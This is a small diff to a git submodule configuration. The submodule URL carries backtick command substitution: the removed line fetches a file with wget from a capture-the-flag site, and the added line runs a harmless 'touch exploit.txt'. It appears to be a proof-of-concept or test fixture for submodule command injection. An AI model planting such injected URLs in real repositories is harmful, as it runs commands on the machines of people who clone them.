@@ -1,3 +1,3 @@
 [submodule "cves"]
 	path = cves
-	url = ssh://`wget https://hackropole.fr/challenges/fcsc2019-web-php-sandbox/docker-compose.public.yml`foo.example.com/bar
+	url = ssh://`touch exploit.txt`foo.example.com/bar
